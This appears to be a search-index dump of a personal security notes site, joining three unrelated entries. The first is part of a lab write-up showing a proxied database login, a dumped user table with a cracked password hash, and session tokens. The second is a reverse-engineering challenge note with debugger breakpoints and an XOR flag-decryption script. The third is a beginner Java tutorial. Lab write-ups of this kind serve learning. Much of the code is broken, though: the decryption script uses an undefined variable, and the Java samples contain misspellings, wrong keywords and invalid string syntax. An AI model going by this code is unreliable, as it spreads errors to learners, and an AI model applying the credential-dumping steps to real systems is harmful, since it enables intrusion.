Connection...\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eproxychains -q  mysql -h 10.10.11.31 -u root -p -P \u003cspan class=\"m\"\u003e14406\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003euser_name \u003cspan class=\"p\"\u003e|\u003c/span\u003e register_date       \u003cspan class=\"p\"\u003e|\u003c/span\u003e email               \u003cspan class=\"p\"\u003e|\u003c/span\u003e password                                 \u003cspan class=\"p\"\u003e|\u003c/span\u003e db_string \u003cspan class=\"p\"\u003e|\u003c/span\u003e is_active \u003cspan class=\"p\"\u003e|\u003c/span\u003e exp_date            \u003cspan class=\"p\"\u003e|\u003c/span\u003e max_users \u003cspan class=\"p\"\u003e|\u003c/span\u003e plan \u003cspan class=\"p\"\u003e|\u003c/span\u003e license_key \u003cspan class=\"p\"\u003e|\u003c/span\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e-----------+--------------+---------------------------------------+-----------+---------------------+---------------------+------------------------------------------+-----------+-----------+---------------------+-----------+------+-------------+-----\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e admin     \u003cspan class=\"p\"\u003e|\u003c/span\u003e 2014-10-18 10:46:30 \u003cspan class=\"p\"\u003e|\u003c/span\u003e demo@outputtime.com \u003cspan class=\"p\"\u003e|\u003c/span\u003e 38f078a81a2b033d197497af5b77f95b50bfcfb8 \u003cspan class=\"p\"\u003e|\u003c/span\u003e           \u003cspan class=\"p\"\u003e|\u003c/span\u003e         \u003cspan class=\"m\"\u003e1\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e 2031-10-29 06:23:42 \u003cspan class=\"p\"\u003e|\u003c/span\u003e         \u003cspan class=\"m\"\u003e0\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e T    \u003cspan class=\"p\"\u003e|\u003c/span\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e38f078a81a2b033d197497af5b77f95b50bfcfb8:admin12\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eTokens :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eMariaDB \u003cspan class=\"o\"\u003e[\u003c/span\u003eoutputwall\u003cspan class=\"o\"\u003e]\u003c/span\u003e\u0026gt; \u003cspan class=\"k\"\u003eselect\u003c/span\u003e * from ot_wall_tokens\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e+----------+---------+------------+---------------------------+-----------+-----------+-------------------------------------------------------------------------------+---------------------+\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e token_id \u003cspan class=\"p\"\u003e|\u003c/span\u003e user_id \u003cspan class=\"p\"\u003e|\u003c/span\u003e first_name \u003cspan class=\"p\"\u003e|\u003c/span\u003e email                     \u003cspan class=\"p\"\u003e|\u003c/span\u003e user_role \u003cspan class=\"p\"\u003e|\u003c/span\u003e entity_id \u003cspan class=\"p\"\u003e|\u003c/span\u003e auth_token                                                                    \u003cspan class=\"p\"\u003e|\u003c/span\u003e expiry_date         \u003cspan class=\"p\"\u003e|\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e+----------+---------+------------+---------------------------+-----------+-----------+-------------------------------------------------------------------------------+---------------------+\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e        \u003cspan class=\"m\"\u003e1\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e       \u003cspan class=\"m\"\u003e7\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e K.turner   \u003cspan class=\"p\"\u003e|\u003c/span\u003e turner@infiltrator.htb    \u003cspan class=\"p\"\u003e|\u003c/span\u003e U         \u003cspan class=\"p\"\u003e|\u003c/span\u003e         \u003cspan class=\"m\"\u003e1\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e iX9Z\u003cspan class=\"se\"\u003e\\/\u003c/span\u003e\u003cspan class=\"nv\"\u003eyslevNIY0R6aKNzBebgT_KpW4BlaGHjWS1zpd5QcmaRx8UGwBvaMxy3Q3Wb2E5XhI9lpIo\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e 2024-02-22 00:00:00 \u003cspan class=\"p\"\u003e|\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e        \u003cspan class=\"m\"\u003e7\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e       \u003cspan class=\"m\"\u003e9\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e winrm_svc  \u003cspan class=\"p\"\u003e|\u003c/span\u003e winrm_svc@infiltrator.htb \u003cspan class=\"p\"\u003e|\u003c/span\u003e U         \u003cspan class=\"p\"\u003e|\u003c/span\u003e         \u003cspan class=\"m\"\u003e1\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e iX9Z\u003cspan class=\"se\"\u003e\\/\u003c/span\u003e\u003cspan class=\"nv\"\u003eyslevMmHLWW_pvaVChN6kbwB_cbGHvAA75yee65xBQMd20Dgmf2iXD18Oq9hiwcgIfB1uo\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e 2024-02-26 00:00:00 \u003cspan class=\"p\"\u003e|\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e       \u003cspan class=\"m\"\u003e16\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e       \u003cspan class=\"m\"\u003e1\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e Admin      \u003cspan class=\"p\"\u003e|\u003c/span\u003e                           \u003cspan class=\"p\"\u003e|\u003c/span\u003e A         \u003cspan class=\"p\"\u003e|\u003c/span\u003e         \u003cspan class=\"m\"\u003e1\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e iX9Z\u003cspan class=\"se\"\u003e\\/\u003c/span\u003eyslevMJZgSfyKCEdHJE3RjYRSAMORYGfFRYTag9N3WBn20KJrgPbziU39gX             \u003cspan class=\"p\"\u003e|\u003c/span\u003e 2024-09-06 00:00:00 \u003cspan class=\"p\"\u003e|\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e+----------+---------+------------+---------------------------+-----------+-----------+-------------------------------------------------------------------------------+---------------------+\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e","tags":[],"title":"Infiltrator"},{"content":" Interesting breakpoint : break main.main break *0x0000000000483834 break *0x483a20 break *0x483600 break *0x0000000000483677\r\\You can see the flag encrypted in main.main and the key in main.x \\\nScript to decrypt the flag def decrypt(plain_text, key): decrypted_output = [] for i in range(len(plain_text)): plain_byte = int(plain_text[i], 16) key_byte = int(key[i], 16) xor_result = plain_byte ^ key_byte result = xor_result if result \u0026gt; 0xFF: result = result % 0x100 hexa = hex(result)[2:] if len(hexa) == 1: hexa = \u0026#39;0\u0026#39; + hexa decrypted_output.append(hexa) hex_string = \u0026#34;\u0026#34;.join(encrypted_output) byte_values = bytes.fromhex(hex_string) return byte_values.decode(\u0026#39;utf-8\u0026#39;) key = [\u0026#39;0x72\u0026#39;, \u0026#39;0xb6\u0026#39;, \u0026#39;0x78\u0026#39;, \u0026#39;0x03\u0026#39;, \u0026#39;0x41\u0026#39;, \u0026#39;0x87\u0026#39;, \u0026#39;0xe1\u0026#39;, \u0026#39;0x53\u0026#39;, \u0026#39;0xc5\u0026#39;, \u0026#39;0xe0\u0026#39;, \u0026#39;0x5f\u0026#39;, \u0026#39;0x48\u0026#39;,\u0026#39;0x2b\u0026#39;, \u0026#39;0x15\u0026#39;, \u0026#39;0x77\u0026#39;, \u0026#39;0xdb\u0026#39;, \u0026#39;0xc7\u0026#39;, \u0026#39;0x09\u0026#39;, \u0026#39;0x66\u0026#39;, \u0026#39;0x79\u0026#39;,\u0026#39;0x72\u0026#39;, \u0026#39;0xb6\u0026#39;, \u0026#39;0x78\u0026#39;, \u0026#39;0x03\u0026#39;, \u0026#39;0x41\u0026#39;, \u0026#39;0x87\u0026#39;, \u0026#39;0xe1\u0026#39;, \u0026#39;0x53\u0026#39;, \u0026#39;0xc5\u0026#39;, \u0026#39;0xe0\u0026#39;, \u0026#39;0x5f\u0026#39;, \u0026#39;0x48\u0026#39;,\u0026#39;0x2b\u0026#39;, \u0026#39;0x15\u0026#39;, \u0026#39;0x77\u0026#39;, \u0026#39;0xdb\u0026#39;, \u0026#39;0xc7\u0026#39;, \u0026#39;0x09\u0026#39;, \u0026#39;0x66\u0026#39;, \u0026#39;0x79\u0026#39;,\u0026#39;0x72\u0026#39;, \u0026#39;0xb6\u0026#39;, \u0026#39;0x78\u0026#39;, \u0026#39;0x03\u0026#39;, \u0026#39;0x41\u0026#39;, \u0026#39;0x87\u0026#39;, \u0026#39;0xe1\u0026#39;, \u0026#39;0x53\u0026#39;, \u0026#39;0xc5\u0026#39;,\u0026#39;0xe0\u0026#39;, \u0026#39;0x5f\u0026#39;, \u0026#39;0x48\u0026#39;,\u0026#39;0x2b\u0026#39;, \u0026#39;0x15\u0026#39;, \u0026#39;0x77\u0026#39;, \u0026#39;0xdb\u0026#39;, \u0026#39;0xc7\u0026#39;, \u0026#39;0x09\u0026#39;,\u0026#39;0x66\u0026#39;, \u0026#39;0x79\u0026#39;] plain_text = [\u0026#39;0x20\u0026#39;, \u0026#39;0xfb\u0026#39;, \u0026#39;0x03\u0026#39;, \u0026#39;0x62\u0026#39;, \u0026#39;0x27\u0026#39;, \u0026#39;0xe3\u0026#39;, \u0026#39;0x83\u0026#39;, \u0026#39;0x61\u0026#39;, \u0026#39;0xf6\u0026#39;, \u0026#39;0x81\u0026#39;, \u0026#39;0x39\u0026#39;, \u0026#39;0x7b\u0026#39;,\u0026#39;0x1a\u0026#39;, \u0026#39;0x77\u0026#39;, \u0026#39;0x47\u0026#39;, \u0026#39;0xe3\u0026#39;, \u0026#39;0xf5\u0026#39;, \u0026#39;0x68\u0026#39;, \u0026#39;0x53\u0026#39;, \u0026#39;0x1d\u0026#39;, \u0026#39;0x4b\u0026#39;, \u0026#39;0x8e\u0026#39;, \u0026#39;0x4d\u0026#39;, \u0026#39;0x33\u0026#39;,\u0026#39;0x70\u0026#39;, \u0026#39;0xb2\u0026#39;, \u0026#39;0x82\u0026#39;, \u0026#39;0x6a\u0026#39;, \u0026#39;0xf0\u0026#39;, \u0026#39;0x85\u0026#39;, \u0026#39;0x6d\u0026#39;, \u0026#39;0x7d\u0026#39;, \u0026#39;0x12\u0026#39;, \u0026#39;0x73\u0026#39;, \u0026#39;0x4f\u0026#39;, \u0026#39;0xe8\u0026#39;,\u0026#39;0xa6\u0026#39;, \u0026#39;0x6d\u0026#39;, \u0026#39;0x55\u0026#39;, \u0026#39;0x4b\u0026#39;, \u0026#39;0x43\u0026#39;, \u0026#39;0x87\u0026#39;, \u0026#39;0x4f\u0026#39;, \u0026#39;0x7e\u0026#39;] decrypt = decrypt(plain_text, key) print(decrypt)\r","date":"2023-09-07","id":59,"permalink":"/notes/pwn-reverse/chall/introduction-to-the-geomyides/","summary":"\u003cul\u003e\n\u003cli\u003eInteresting breakpoint :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003ebreak\u003c/span\u003e main.main\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003ebreak\u003c/span\u003e *0x0000000000483834\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003ebreak\u003c/span\u003e *0x483a20\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003ebreak\u003c/span\u003e *0x483600\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003ebreak\u003c/span\u003e *0x0000000000483677\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cp\u003e\\You can see the flag encrypted in main.main and the key in main.x \\\u003c/p\u003e","tags":[],"title":"Introduction to the Geomyides"},{"content":"1. Basic Java Syntax Structure of a Java Program A Java program is structured around classes. Every Java program starts with at least one class, and there must be a main method in one of these classes. The main method is the entry point for the program\u0026rsquo;s execution.\npublic class MonPremierProgramme { public static void main(String[] args) { } }\rVariable Declarations In Java, variables must be declared with an explicit type. Here\u0026rsquo;s how you declare and initialize a variable:\nint age = 30; String nom = \u0026#34;John\u0026#34;; double montant = 45.50; final Variable In Java, the final keyword is used to declare a constant variable, which means a variable whose value cannot be changed once it\u0026rsquo;s assigned.\nfinal int age = 30;\rSpecial Characters Newline Character (\\n) The newline character, represented by \\n, is used to indicate the end of a line of text. It is commonly used to create line breaks within strings or text files.\nExample:\nString message = \u0026#34;First line\\nSecond line\u0026#34;;\rTab Character (\\t) The tab character, represented by \\t, is used to insert a tab or a series of spaces within a string. It is useful for formatting text with consistent spacing.\nExample:\nString formattedText = \u0026#34;Name:\\tJohn\\nAge:\\t30\u0026#34;;\rBackslash Character (\\\\) The backslash character, represented by \\\\, is used to escape another special character, such as the backslash itself. For example, to include a backslash within a string, you need to use \\\\.\nExample:\nString path = \u0026#34;C:\\\\Program Files\\\\MyApp\u0026#34;;\rQuote Characters (\\' and \\\u0026quot;) Single quote (\\') and double quote (\\\u0026quot;) characters are used to escape quotes within strings. For instance, to include a single quote within a string surrounded by single quotes, you can use \\'.\nExamples:\nString singleQuote = \u0026#39;I\\\u0026#39;m a programmer.\u0026#39;; String doubleQuote = \u0026#34;He said, \\\u0026#34;Hello!\\\u0026#34;\u0026#34;;\rCarriage Return Character (\\r) The carriage return character, represented by \\r, is primarily used in certain operating systems to return to the beginning of a line. It is less common than the newline character \\n.\nLine Feed Character (\\f) The form feed character, represented by \\f, is used to perform a page break in some word processing and printing systems.\nOperators Java supports various operators, including arithmetic operators (+, -, *, /, %), comparison operators (==, !=, \u0026lt;, \u0026gt;, \u0026lt;=, \u0026gt;=), and logical operators (\u0026amp;\u0026amp;, ||, !).\nLoops and Conditional Structures Conditional Structures Conditional structures, such as if, else if, and else, are used to make decisions in your program based on certain conditions.\nint age = 18; if (age \u0026lt; 18) { System.out.println(\u0026#34;Vous êtes mineur.\u0026#34;); } else if (age == 18) { System.out.println(\u0026#34;Vous avez tout juste 18 ans !\u0026#34;); } else { System.out.println(\u0026#34;Vous êtes majeur.\u0026#34;); }\rSwitch Case Switch Case is a control structure used in programming to make decisions based on the value of an expression. It allows you to evaluate an expression and execute different statements based on the value of the expression.\nint dayOfWeek = 3; switch (dayOfWeek) { case 1: System.out.println(\u0026#34;Monday\u0026#34;); break; case 2: System.out.println(\u0026#34;Tuesday\u0026#34;); break; case 3: System.out.println(\u0026#34;Wednesday\u0026#34;); break; default: System.out.println(\u0026#34;Unknown day\u0026#34;); }\rLoops Loops, such as for, while, and do-while, are used to repeatedly execute a block of code.\nfor (int i = 0; i \u0026lt; 5; i++) { System.out.println(\u0026#34;Tour de boucle n° \u0026#34; + i); } int compteur = 0; while (compteur \u0026lt; 5) { System.out.println(\u0026#34;Tour de boucle n° \u0026#34; + compteur); compteur++; } do { Sytem.out.println(\u0026#34;Tour de boucle\u0026#34;) compteur++ } while(compteur != 10)\rFor Loop A for loop is a control structure used in programming to repeatedly execute a block of code a specific number of times. It is particularly useful when you know in advance how many times you want to execute a certain set of instructions.\nThe typical syntax of a \u0026ldquo;for\u0026rdquo; loop in many programming languages is as follows:\nfor (initialization; condition; increment/decrement) { }\rInitialization: This part is where you set an initial value for a loop control variable. Condition: The loop will continue executing as long as this condition is true. Increment/Decrement: This part allows you to update the loop control variable in each iteration. Here\u0026rsquo;s a simple example in Java:\nfor (int i = 0; i \u0026lt; 5; i++) { System.out.println(\u0026#34;Iteration \u0026#34; + i); }\rIn this example, the loop starts with i initialized to 0. It continues as long as i is less than 5, and i is incremented by 1 in each iteration. The loop will run five times, and it will print \u0026ldquo;Iteration 0\u0026rdquo; through \u0026ldquo;Iteration 4\u0026rdquo; to the console.\nPrivate Variable in Java In Java, the private access modifier is used to restrict the visibility of a class\u0026rsquo;s fields or variables. When a variable is declared as private, it can only be accessed within the same class in which it is declared. This means that the variable is not visible or accessible from other classes, even if they are part of the same package.\nThe primary purpose of using private variables is to encapsulate the internal state of a class, providing a level of data hiding and protection. It allows you to control and restrict access to the variable, ensuring that the internal data remains private and is not directly manipulated by external classes.\nHere\u0026rsquo;s an example of a Java class with a private variable:\npublic class Person { private String name; public Person(String name) { this.name = name; } public String getName() { return name; } }\rIn this example, the name variable is declared as private. This means that it can only be accessed and modified within the Person class itself. External classes cannot directly access or modify the name variable. Instead, they must use a public method like getName() to retrieve the value of the name variable\nAttributes and Class Construction in Java In Java, as in most object-oriented programming languages, a class serves as a blueprint for creating objects. Attributes, also known as fields or instance variables, define the state of objects, and constructors are used to initialize objects. Here\u0026rsquo;s how it works:\nAttributes Attributes are variables defined within a class to represent the state or properties of objects created from that class. In Java, attributes are declared as fields. For example, consider a class Person with attributes like name and age:\npublic class Person { String name; int age; }\r`\nIn this class, name and age are attributes that describe the state of each Person object.\nClass Construction Class construction in Java involves the use of constructors. A constructor is a special method in a class used to create and initialize objects of that class. Here\u0026rsquo;s an example:\npublic class Person { Private String name; Private int age; public Person(String name, int age) { this.Nname = name; this.Nage = age; Sytem.out.println(\u0026#34;votre nom est \u0026#34;+Nname+\u0026#34;et vous avez \u0026#34;+Nage+\u0026#34;ans\u0026#34;) } }\rIn this Java example, the Person class has a constructor that takes name and age as parameters and initializes the object\u0026rsquo;s attributes. You can create a Person object as follows:\nThat what we are going to use in the main class:\nPerson person1 = new Person(\u0026#34;John\u0026#34;, 30);\rIn Output we\u0026rsquo;ll have :\nvotre nom est John et vous avez 30 ans\rThe new keyword is used to create a new instance of the Person class, and the constructor sets the initial values of the object\u0026rsquo;s attributes.\nMethods In programming, a method (also known as a function or subroutine) is a block of code that performs a specific task or set of tasks. Methods are used to encapsulate functionality, promote code reusability, and structure a program into smaller, more manageable pieces. In this course, we\u0026rsquo;ll explore the key aspects of methods, including their syntax, parameters, return values, and best practices.\nMethod Syntax The syntax for defining a method varies slightly depending on the programming language, but it generally consists of the following components:\nreturn_type method_name(parameters) { // Method body return result; // (optional) }\rReturn Type: The data type of the value the method returns. If the method doesn\u0026rsquo;t return a value, it is often declared as void.\nMethod Name: A unique identifier for the method within its scope, which is used to call the method.\nParameters: Input values that the method accepts (optional). Parameters are enclosed in parentheses and specify the data type and variable name for each parameter.\nMethod Body: The block of code enclosed in curly braces {} that contains the statements and logic of the method.\nReturn Statement: If the method returns a value, it uses a return statement to send the result back to the caller.\nMethod Declaration Here\u0026rsquo;s an example of a simple method declaration in Java:\npublic int add(int num1, int num2) { int sum = num1 + num2; return sum; }\rIn this Java example, the method add takes two integers as parameters, calculates their sum, and returns the result.\nMethod Invocation To use a method, you invoke (call) it by using its name, providing the required arguments (if any), and optionally capturing the returned value:\nint result = add(5, 3); // Invoking the add method System.out.println(\u0026#34;Sum: \u0026#34; + result);`\rMethod Overloading Method overloading allows you to define multiple methods with the same name but different parameter lists. The method to be executed is determined by the number or types of arguments provided when calling the method.\npublic int add(int num1, int num2) { /* ... */ } public double add(double num1, double num2) { /* ... */ }`\rMethod Best Practices Use descriptive method names to convey the purpose. Keep methods short and focused on a single task. Avoid deeply nested methods. Minimize the number of method parameters for simplicity and readability. Document methods using comments or documentation comments to describe their purpose and usage Getters and Setters(Encapsulation) Getters and setters are methods used to access and modify the private attributes (fields) of a class. They provide controlled access to the internal state of an object, following the principles of encapsulation, allowing you to protect the data and enforce validation rules.\nThe Need for Getters and Setters In many object-oriented programming languages, it is a best practice to make class attributes private (or protected) to encapsulate data and prevent direct access from outside the class. This is where getters and setters come into play. They allow for controlled access to the private attributes, ensuring that the object\u0026rsquo;s state remains consistent and valid.\nGetters A getter is a method that retrieves the value of a private attribute. Its purpose is to provide read-only access to that attribute. The method\u0026rsquo;s name typically starts with \u0026ldquo;get\u0026rdquo; followed by the attribute name (in camel case).\npublic class Person { private String name; public String getName() { return name; } }\rIn this example, the getName() method is a getter that allows external code to read the value of the name attribute.\nSetters A setter is a method that allows you to modify the value of a private attribute. Its name typically starts with \u0026ldquo;set\u0026rdquo; followed by the attribute name (in camel case). Setters can also include validation logic to ensure that the new value meets certain criteria.\npublic class Person { private int age; public void setAge(int age) { if (age \u0026gt;= 0) { this.age = age; } } }\rIn this example, the setAge(int age) method is a setter that sets the value of the age attribute, but only if the provided value is non-negative.\nHere is one last example :\npublic class Person { private String name; // Private attribute public String getName() { return name; // Getter } public void setName(String name) { if (name != null \u0026amp;\u0026amp; !name.isEmpty()) { this.name = name; // Setter with validation } } }\rBenefits of Getters and Setters Encapsulation: Getters and setters provide a level of data hiding, ensuring that the internal state of an object is protected from direct access.\nControl: You can control how attributes are accessed and modified, enabling you to validate and manipulate data as needed.\nFlexibility: You can change the internal representation of data (e.g., switching from a variable to a calculated value) without affecting the external code that uses the getter and setter.\nReadability: Using getters and setters in your code makes it clear when you are reading or modifying an attribute.\nWhen to Use Getters and Setters While it\u0026rsquo;s a good practice to use getters and setters for most attributes, there are exceptions. Not all attributes require getters and setters. Public attributes (if necessary) are generally used for simple data transfer objects (DTOs), where the attributes have no additional logic or validation requirements.\nArrays in Java An array in Java is a data structure that allows you to store a collection of elements of the same data type. Arrays have a fixed size, which means you need to specify the size of the array when creating it, and this size cannot be changed afterward.\nDeclaring an Array in Java To declare an array in Java, you need to specify the data type of the array\u0026rsquo;s elements, followed by the array name and square brackets [] to indicate that it\u0026rsquo;s an array. Here\u0026rsquo;s how you can declare an array of integers in Java:\nint[] myArray;\rYou can also initialize an array when declaring it like this:\nint[] myArray = {1, 2, 3, 4, 5};\rAccessing Array Elements To access the elements of an array, you use the element\u0026rsquo;s index within square brackets. Indices start at 0 for the first element of the array. Here\u0026rsquo;s how you can access array elements:\nint firstElement = myArray[0]; // Access the first element int secondElement = myArray[1]; // Access the second element`\rModifying Array Elements You can modify array elements by using the element\u0026rsquo;s index. For example:\nmyArray[2] = 42; // Modifying the third element\rArray Size The size of an array in Java can be obtained using the length property. For example:\nint size = myArray.length; // Getting the size of the array\rIterating Through an Array To iterate through all the elements of an array, you can use a for loop or a foreach loop. Here\u0026rsquo;s how you can iterate through an array of integers using a for loop:\nfor (int i = 0; i \u0026lt; myArray.length; i++) { int element = myArray[i]; // Do something with the element }\rYou can also use a foreach loop to iterate through an array more concisely:\nfor (int element : myArray) { // Do something with the element Q}\rMultidimensional Arrays In addition to one-dimensional arrays, Java also supports multidimensional arrays. You can create arrays with two dimensions, three dimensions, and so on. To declare a two-dimensional array, you can do the following:\nint[][] twoDArray = new int[3][4]; // A 3x4 array\rTo access elements in a two-dimensional array, you use two indices, one for the row and the other for the column:\nint value = twoDArray[1][2]; // Access the element in the second row and third column\rCharacter Manipulation in Java In Java, characters are represented using the char data type. Characters are used to store single letters, digits, or special symbols. Java provides various methods and operations to work with characters.\nDeclaring and Initializing a Character To declare and initialize a character in Java, you can use the char keyword. Here\u0026rsquo;s how you can declare and assign a character:\nchar myChar = \u0026#39;A\u0026#39;; // Assign the character \u0026#39;A\u0026#39; to myChar\rCharacter Escape Sequences Characters can be represented using escape sequences to include special characters like newline ('\\n'), tab ('\\t'), and others. Here are some common escape sequences:\n'\\n': Newline '\\t': Tab '\\r': Carriage return '\\'': Single quote '\\\u0026quot;': Double quote '\\\\': Backslash For example:\nchar newlineChar = \u0026#39;\\n\u0026#39;; // Represents a newline character char tabChar = \u0026#39;\\t\u0026#39;; // Represents a tab character`\rConverting Characters to Strings You can convert a char to a String using the Character.toString() method or by concatenating it with an empty string. Here are examples of both methods:\nchar myChar = \u0026#39;A\u0026#39;; String charToString1 = Character.toString(myChar); String charToString2 = myChar + \u0026#34;\u0026#34;; // Concatenating with an empty string`\rCharacter Comparison You can compare characters in Java using relational operators, such as ==, \u0026lt;, \u0026gt;, and so on. For example:\nchar char1 = \u0026#39;A\u0026#39;; char char2 = \u0026#39;B\u0026#39;; boolean isEqual = (char1 == char2); isLessThan = (char1 \u0026lt; char2); // Check if char1 is less than char2\r.compare() Method:\nThe .compare() method is primarily used with objects that implement the Comparable interface, such as String, to compare two objects. It is used for ordering or sorting objects and returns an integer value indicating their relationship. The method signature for .compare() is typically:\nint compare(T o1, T o2)` ```\n- If `o1` is less than `o2`, it returns a negative integer. - If `o1` is greater than `o2`, it returns a positive integer. - If `o1` is equal to `o2`, it returns 0. Here's an example of how you can use `.compare()` with strings: String str1 = \u0026#34;apple\u0026#34;; String str2 = \u0026#34;banana\u0026#34;; int result = str1.compareTo(str2); if (result \u0026lt; 0) { System.out.println(\u0026#34;str1 comes before str2\u0026#34;); } else if (result \u0026gt; 0) { System.println(\u0026#34;str2 comes before str1\u0026#34;); } else { System.out.println(\u0026#34;str1 and str2 are equal\u0026#34;); }\r.equals() Method:\nThe .equals() method is used to compare the content or value of two objects for equality. It\u0026rsquo;s widely used to compare objects of classes that override the equals method, such as String. The method signature for .equals() is typically:\nboolean equals(Object obj)\rWhen comparing two objects using .equals(), it checks whether the content or value of the objects is the same, and it returns a boolean value:\nIf the objects are equal, it returns true. If the objects are not equal, it returns false. Here\u0026rsquo;s an example of how you can use .equals() with strings:\n`String str1 = \u0026ldquo;apple\u0026rdquo;; String str2 = \u0026ldquo;apple\u0026rdquo;; boolean areEqual = str1.equals(str2); if (areEqual) {\nSystem.out.println(\u0026ldquo;str1 and str2 are equal\u0026rdquo;); } else {\nSystem.out.println(\u0026ldquo;str1 and str2 are not equal\u0026rdquo;); }\nThis code will output \u0026#34;str1 and str2 are equal\u0026#34; because the content of `str1` and `str2` is the same. 3. **The `length()` Method** The `length()` method is used to obtain the length of a string in Java. It returns the number of characters present in the string, including spaces and special characters. Here\u0026#39;s how to use it: ```java String myString = \u0026#34;Hello, World!\u0026#34;; int length = myString.length(); System.out.println(\u0026#34;Length of the string: \u0026#34; + length);`\rThe concat() Method\nThe concat() method is used to concatenate (join) two strings into one. It returns a new string that is the result of combining the two strings. Here\u0026rsquo;s how to use it:\nString str1 = \u0026ldquo;Hello, \u0026ldquo;; String str2 = \u0026ldquo;World!\u0026rdquo;; String result = str1.concat(str2); System.out.println(result); // Prints \u0026ldquo;Hello, World!\u0026quot;`\n### Character Methods In addition to `length()` and `concat()`, Java provides a variety of other commonly used methods for manipulating strings. Here are some of these methods: - `charAt(int index)`: Returns the character at the specified index in the string. - `substring(int beginIndex)`: Returns a substring starting at the specified index. - `substring(int beginIndex, int endIndex)`: Returns a substring from the beginning index to the specified end index. - `toUpperCase()`: Converts the string to uppercase. - `toLowerCase()`: Converts the string to lowercase. - `trim()`: Removes leading and trailing whitespace from the string. - `replace(char oldChar, char newChar)`: Replaces all occurrences of `oldChar` with `newChar` in the string. - `split(String regex)`: Divides the string into multiple substrings based on a regular expression. - `startsWith(String prefix)`: Checks if the string starts with the specified prefix. - `endsWith(String suffix)`: 